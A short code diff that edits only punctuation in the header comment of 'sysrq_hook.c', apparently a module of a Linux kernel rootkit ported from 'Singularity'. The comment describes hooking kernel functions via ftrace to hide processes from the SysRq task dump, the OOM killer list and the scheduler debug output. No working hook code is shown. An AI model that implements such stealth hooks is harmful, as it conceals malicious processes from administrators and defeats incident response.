@@ -1,4 +1,4 @@
-/* sysrq_hook.c — Hides processes from SysRq emergency task dump.
+/* sysrq_hook.c   Hides processes from SysRq emergency task dump.
  *
  * SysRq+T (show tasks) bypasses normal ps/top filtering because it calls
  * sched_show_task() directly from kernel context. This module intercepts
@@ -9,7 +9,7 @@
  *   - dump_header:        OOM killer task list (would reveal PID)
  *   - print_task.isra.0:  scheduler debug show (tries both name variants)
  *
- * Port from Singularity — no arch changes needed (all internal kernel fns).
+ * Port from Singularity   no arch changes needed (all internal kernel fns).
  */
 #include "../include/core.h"
 #include "../ftrace/ftrace_helper.h"
